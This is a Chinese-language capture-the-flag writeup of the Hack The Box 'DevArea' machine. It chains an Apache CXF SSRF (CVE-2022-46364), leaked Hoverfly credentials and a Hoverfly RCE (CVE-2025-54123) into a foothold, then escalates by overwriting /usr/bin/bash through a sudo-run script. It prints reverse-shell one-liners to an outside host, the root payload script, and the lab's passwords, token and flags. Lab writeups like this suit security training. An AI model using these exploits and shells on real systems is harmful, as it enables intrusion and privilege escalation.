---
title: HTB DevArea 靶场 Writeup
date: 2026-08-24 20:15:00
categories:
  - 靶场
tags:
  - HTB
  - DevArea
  - 靶场
description: HTB DevArea 靶场 Writeup
---

### **DevArea**

#### nmap

```
nmap -sS -sV 10.129.116.255
```

![image-20260330180555432](/img/htb/htb-devarea-001.png)

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5       文件传输服务
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)    远程登录
80/tcp   open  http    Apache httpd 2.4.58        web服务器
8080/tcp open  http    Jetty 9.4.27.v20200227      Jatty容器
8500/tcp open  http    Golang net/http server    代理服务器go写的
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)  go写的API / 面板 / 调试服务 / 数据服务

devArea.htb

```
echo "10.129.116.255 devArea.htb" | sudo tee -a /etc/hosts
```

访问，是一个网站

![image-20260330174646588](/img/htb/htb-devarea-002.png)

但是右上角的login和register进不了，扫目录

```
ffuf -c -u 'http://devArea.htb/FUZZ' \
-w ~/SecLists/Discovery/Web-Content/common.txt
```

没扫到

#### 21： ftp  vsftpd 3.0.5   文件传输服务

hydra爆破一下用户名和密码

```
hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 6 -e ns ftp://10.129.116.255 -V
```

![image-20260330200554847](/img/htb/htb-devarea-003.png)

#### 匿名 FTP 连接：

交互式登录，用户名是anonymous，没有密码

```
ftp 10.129.207.190 21
```

![image-20260330200010237](/img/htb/htb-devarea-004.png)

信息收集：

![image-20260330201240346](/img/htb/htb-devarea-005.png)

找到目录pub

![image-20260330204236047](/img/htb/htb-devarea-006.png)

发现一个jar包，get下载一下

jadx打开：

![image-20260330215336989](/img/htb/htb-devarea-007.png)

访问:8080/employeeservice和:8080/employeeservice?wsdl

![image-20260330215422805](/img/htb/htb-devarea-008.png)

![image-20260330215640119](/img/htb/htb-devarea-009.png)

`?wsdl` 能访问这说明 **8080 上确实是 SOAP Web Service**，而且 **WSDL 公开可读**

WSDL 里关键信息是：

- 服务名：`EmployeeServiceService`
- 端口名：`EmployeeServicePort`
- 方法名：`submitReport`
- 目标命名空间：`http://devarea.htb/`
- 实际端点：`http://10.129.116.255:8080/employeeservice`

但直接 GET `/employeeservice` 返回 500，说明访问到了 SOAP 端点，但没有按 SOAP 格式发请求

发一个 `POST` 到：

```
http://10.129.116.255:8080/employeeservice
```

请求头：

```
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
```

请求体可以先用这个最小合法包：

```
<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>test</content>
        <department>IT</department>
        <employeeName>echoin</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
```

![image-20260331200726143](/img/htb/htb-devarea-010.png)

说明可以利用，找一下SOAP Web Service的漏洞

#### SOAP Web Service的漏洞利用

> 在渗透测试中，**available SOAP services** 通常通过访问 *?wsdl* 暴露接口信息，攻击者可利用这些接口进行漏洞探测与利用。例如，访问 *http://target.com/service.asmx?wsdl* 获取接口定义后，可构造恶意SOAP请求触发漏洞。
>
> [SOAP协议安全攻防录-先知社区](https://xz.aliyun.com/news/12728)

相关利用有xss,xxe,ssrf,sql，xss和xxe都试了，sql的话源码里没有数据库信息，所以ssrf,找一下cve

#### 利用 Apache CXF SSRF 漏洞 (CVE-2022-46364)

poc:[kasem545/CVE-2022-46364-Poc: CVE-2022-46364-Poc Apache CXF SSRF via MTOM XOP:Include](https://github.com/kasem545/CVE-2022-46364-Poc)

![image-20260331210715333](/img/htb/htb-devarea-011.png)

可以读取etc/passwd

![image-20260331211240112](/img/htb/htb-devarea-012.png)

root用户：dev_ryan

用户：syswatch

![image-20260331211711525](/img/htb/htb-devarea-013.png)

当前主机名devarea

直接读root用户dev_ryan

![image-20260331212308983](/img/htb/htb-devarea-014.png)

找到：syswatch-v1.zip和user.txt

但是user.txt没有读取权限，可能要拿到shell才能看，但是syswatch-v1.zip可读

syswatch-v1.zip读取到很多syswatch相关内容。但是乱码，还原一下：

这个exp脚本有个弊端，就是终端无法完整的显示base64，还原代码比较麻烦，所以改一下脚本，

![image-20260331215053027](/img/htb/htb-devarea-015.png)

改完之后得到完整base64

```
cat > /tmp/syswatch.b64 <<'EOF'
base64内容
EOF
```

还原 zip

```
base64 -d /tmp/syswatch.b64 > syswatch-v1.zip
file syswatch-v1.zip
unzip -l syswatch-v1.zip | head -n 50
```

![image-20260331215738598](/img/htb/htb-devarea-016.png)

解压

```
mkdir -p /tmp/syswatch-src
unzip syswatch-v1.zip -d /tmp/syswatch-src
```

![image-20260331215534863](/img/htb/htb-devarea-017.png)

现在思路。审这个代码，找漏洞点，目的连shell

初步判断，这个zip是这个网站的源码

![image-20260401134717671](/img/htb/htb-devarea-018.png)

找到admin的password_hash: scrypt:32768:8:1$IyKfaiteB3TNFK6Hv$a0fbf5283db6a13859776827133e99d4d5ab43e85bedd05b06119e6fdca096ac81570d4497a836d09a155884182b6442cfcf6986b96310b514f34d9da871cb70

在setup.sh:

 /etc/syswatch.env文件里写入：`SYSWATCH_SECRET_KEY`和`SYSWATCH_ADMIN_PASSWORD`

默认密码是SyswatchAdmin2026

权限是755,可读

![image-20260401141844354](/img/htb/htb-devarea-019.png)

读取 /etc/syswatch.env文件

![image-20260401142629066](/img/htb/htb-devarea-020.png)

得到：

SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026

但是无法利用去登录用户，这里看wp 说这个主机上跑的Hoverfly 服务，对应8888端口，在源码的confg的文件里也有提到，所以读取一下系统文件/etc/systemd/system/hoverfly.service

![image-20260401145856314](/img/htb/htb-devarea-021.png)

得到：

User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

#### Hoverfly API利用

> Hoverfly是一个轻量的API服务模拟工具

使用提取的凭据对 Hoverfly API 进行身份验证，并获取访问令牌

![image-20260401152446401](/img/htb/htb-devarea-022.png)

admin  O7IJ27MyyXiU  登录

![image-20260401152603373](/img/htb/htb-devarea-023.png)

获取JWT  token

![image-20260401161208253](/img/htb/htb-devarea-024.png)

```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYwNjk3ODAsImlhdCI6MTc3NTAyOTc4MCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.S8b2IMAW6f8Thm7eFXz0Ul0JrxYeUBRt-5rBpAFL1QaRSsvJmg16Ov4B6DMZ5TZSXd1DxjHkSTCzf-fUar6bsQ
```

#### Hoverfly远程代码执行 CVE-2025-54123

poc:[kasem545/CVE-2025-54123-Poc：CVE-2025-54123 Hoverfly 认证中间件命令注入 RCE](https://github.com/kasem545/CVE-2025-54123-Poc)

```
python3 cve-2025-54123.py -t http://10.129.207.190:8888 -u admin -p O7IJ27MyyXiU -c "bash -i >& /dev/tcp/10.10.16.23/1234 0>&1"
```

![image-20260401162118657](/img/htb/htb-devarea-025.png)

拿到shell

![image-20260401162530447](/img/htb/htb-devarea-026.png)

flag 1:d22ae9c06aeaaa8ccaba6fea2bb98067

#### 提权

sudo -l

![image-20260401162419398](/img/htb/htb-devarea-027.png)

说明可以利用syswatch/syswatch.sh执行root命令,

/bin/bash可编写，并通过 Sudo 以 root 方式运行——当 syswatch 执行时，它会内部调用，这意味着我们可以用恶意脚本替代 bash

![image-20260401165253475](/img/htb/htb-devarea-028.png)

以下复现：[HackTheBox Season 10 DevArea 难度:Medium - 信息安全知识库](https://www.gm7.org/archives/65454)

#### 备份 bash + 创建 payload（当前shell中执行）

```
cp /usr/bin/bash /tmp/bash.bak

cat > /tmp/payload.sh << 'EOF'
#!/tmp/bash.bak                      //用 /tmp/bash.bak 来解释执行
cat /root/root.txt > /tmp/root.txt   //把flag写入了/tmp/root.txt
chmod 777 /tmp/root.txt
cp /tmp/bash.bak /tmp/rootbash
chmod +s /tmp/rootbash
cp /tmp/bash.bak /usr/bin/bash
exec /tmp/bash.bak "$@"              //用真正的 bash 执行当前收到的原始参数，并用它替换当前进程
EOF

chmod +x /tmp/payload.sh
```

`<< 'EOF'`带单引号，表示**不要在当前 shell 里展开变量、命令替换**，完全原样写入文件

#### 连接第二个shell

```
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.16.23',9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/dash','-i'])"
```

监听：

```
nc -lvnp 9002
```

#### 执行权限提升

```
kill -9 $(pgrep -x bash) 2>/dev/null      //先杀所有 bash 进程，然后才执行为了释放对 bash 的占用

dd if=/tmp/payload.sh of=/usr/bin/bash    //dd:直接把payload字节写进目标文件

sudo /opt/syswatch/syswatch.sh --version  //以root执行payload.sh

cat /tmp/root.txt
```

虽然 `whoami` 还显示 `dev_ryan`，但 payload 已经成功以 root 身份执行并把 flag 写入了 `/tmp/root.txt`

![image-20260401172851480](/img/htb/htb-devarea-029.png)

flag 2:33691ecec0ac0214836b4dbe565bed87
